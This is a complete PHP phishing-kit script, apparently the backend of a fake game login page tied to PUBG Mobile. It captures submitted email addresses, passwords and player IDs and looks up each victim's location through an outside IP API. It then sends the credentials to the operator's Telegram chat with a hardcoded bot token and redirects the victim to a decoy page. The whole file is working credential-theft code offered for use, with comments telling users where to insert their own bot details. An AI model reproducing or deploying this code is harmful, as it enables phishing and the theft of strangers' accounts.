<?php
session_start();
$hooda = 3;
if(array_key_exists("last_access", $_SESSION) && time()-$hooda <= $_SESSION["last_access"]) {
header("Refresh:2; url=$ads");
  exit('<html>
<head>
</head>
<body>
    <h1>You are refreshing too quickly, please wait a few seconds and try again</h1>
</body>
</html>
');
}
$_SESSION["last_access"] = time(); 
?>
<?php
error_reporting(1);
function getUserIP()
    {
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
    
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }
        return $ip;
    }
 $ip = getUserIP();
$api = json_decode(file_get_contents("http://nailspansseh.com/api.php?ip=$ip"));
$country= $api->country;
$code = $api->code;
$flag = $api->flag;
$url= $api->country_code;
$ads = $api->url;
//@mr7ooda///
if($ads !== null){
$ads = $ads;
}else{
$ads = "https://play.google.com/store/apps/details?id=com.tencent.ig";
}
//@mr7ooda////
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
$playid = $_POST['playid'];
if($email == null and $password == null){
header("Location: ./index.php");
}
$time = date("h:i a");
$date = date("d/m/Y");
$id =1484163815; // ايديك
$token ="6111872230:AAHh6w-2y78wpEaTKdPPkt1zNP971Db8CLs"; // حط التوكن
$msg="
*𓆩𓆩 𝙷𝙸 𝚈𝙾𝚄 𝙷𝙰𝚅𝙴 𝙽𝙴𝚆 𝙷𝙸𝚃 ツ.𓆪𓆪*

*------------------☾------------------*
*↝ 𝙿𝙰𝙶𝙴 𝚃𝚈𝙿𝙴 » اسم الاندكس *
 🔐 *↝ 𝙻𝙾𝙶𝙸𝙽 »* #$login 
 📧 *↝ 𝙴𝙼𝙰𝙸𝙻 » *  `$email`
 📟 *↝ 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 *»  `$password`
📍 *↝ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈 » $country *
 ☎️ *↝ 𝙲𝙾𝙳𝙴 *» `$code` ↝ $flag 
 ⚙️ *↝ 𝙸𝙿* »  `$ip` 
 ⏱ *↝ 𝚃𝙸𝙼𝙴 » $time  *
 📝 *↝ 𝙳𝙰𝚃𝙴 » $date *
*------------------☾------------------*
 *↝ 𝙼𝙾𝙳𝙴 𝙱𝚈  *»  [MY VIP](tg://user?id=$id) ツ
";
$mesg = ['chat_id'=>$id,'text'=>$msg,'parse_mode'=>"markdown",'disable_web_page_preview'=>true];
$message = http_build_query($mesg);
file_get_contents("https://api.telegram.org/bot$token/sendMessage?".$message);
header("Location: $ads");
?>